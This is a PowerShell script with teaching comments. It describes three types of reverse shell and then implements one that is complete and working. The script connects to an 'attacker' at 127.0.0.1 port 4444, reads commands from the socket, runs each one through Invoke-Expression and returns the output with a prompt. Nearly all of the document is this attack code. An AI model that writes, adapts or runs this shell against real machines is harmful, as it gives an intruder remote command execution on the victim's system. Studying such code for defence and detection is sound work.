# For clarification, there are 3 types of 
# reverse shells:
#
# 1. Fully independant shell, whose standard
#    input, output, and error is piped through
#    a socket.
#
# 2. A intermediary between shell and connection.
#    This may be a program that reads from a
#    socket stream, writes that to a shell, then
#    reads from the shell, and pipes the output
#    through the connection.
#
# 3. Lastly, we have an in-shell reverse shell,
#    where the shell itself manages the socket,
#    executes commands received, and writes the
#    output to its socket stream.


# This is a good example of an "in-shell" reverse shell.


# Firstly, we need to accomplish 4 things:
#
# 1. Connect to the attacker. Save connection as
#    a variable.
#
# 2. Save the stream to a variable, as we need to
#    create a stream reader and writer.
#
# 3. Create the stream reader and writer, and
#    save them to variables.
#
# 4. Then continuously read from the stream,
#    execute it as a command, format the output,
#    then send this back to the attacker.

# Connect to the attacker.

$Attacker                               = [Net.Sockets.TCPClient]::New("127.0.0.1", 4444)

# Save the stream to a variable.

$Stream                                 = $Attacker.GetStream()

# Create a reader to read from the stream, and a
# writer to write to the stream. (Note: we need
# to set autoflush to true, so we don't have to
# manually flush the stream every time we write)

$Reader                                 = [IO.StreamReader]::New($Stream)
$Writer                                 = [IO.StreamWriter]::New($Stream)
$Writer.AutoFlush                       = 1

# Send over a prompt to let the attacker know
# once variables have been established.

$Prompt                                 = "PS " + (Get-Location) + "> "
$Writer.Write($Prompt)

# Continuously read, execute, format, and send
# while connected.

while($Attacker.Connected)
{
    $Command                            = $Reader.ReadLine()
    $ExecutedCommandOutput              = Invoke-Expression $Command | Out-String
    $Prompt                             = "PS " + (Get-Location) + "> "
    $FormattedOutput                    = $ExecutedCommandOutput + $Prompt
    $Writer.Write($FormattedOutput)
}
